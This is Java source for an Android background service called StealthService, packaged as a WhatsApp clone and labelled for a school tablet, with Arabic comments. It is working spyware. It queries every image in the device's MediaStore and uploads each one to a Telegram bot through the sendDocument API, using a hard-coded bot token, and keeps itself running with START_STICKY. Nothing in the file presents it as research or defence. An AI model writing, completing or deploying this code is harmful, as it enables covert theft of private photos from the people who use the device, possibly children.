// language: Java, file: StealthService.java, target: Android / School Tablet
package com.whatsapp.clone.stealth;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import java.io.File;
import java.io.IOException;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class StealthService extends Service {

    // الـ Token بتاع البوت اللي طلعناه من BotFather
    private static final String BOT_TOKEN = "9185552010:AAEWWxz3ovVN1p2_3jF12dZxqVYqblMKzug";
    // الـ Chat ID بتاع حسابك على تيليجرام
    private static final String CHAT_ID = "حط_الـ_شات_آي دي_هنا";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // تشغيل عملية السحب في خيط خلفي عشان التطبيق ما يهنجش
        new Thread(() -> {
            harvestAndSendImages();
        }).start();

        return START_STICKY;
    }

    private void harvestAndSendImages() {
        ContentResolver resolver = getContentResolver();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = { MediaStore.Images.Media.DATA };

        Cursor cursor = resolver.query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
        if (cursor != null) {
            OkHttpClient client = new OkHttpClient();
            int index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

            while (cursor.moveToNext()) {
                String path = cursor.getString(index);
                if (path != null) {
                    File file = new File(path);
                    if (file.exists()) {
                        sendToTelegram(client, file);
                    }
                }
            }
            cursor.close();
        }
    }

    private void sendToTelegram(OkHttpClient client, File file) {
        try {
            RequestBody fileBody = RequestBody.create(file, MediaType.parse("image/*"));
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("document", file.getName(), fileBody)
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
                    .post(body)
                    .build();

            Response response = client.newCall(request).execute();
            response.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
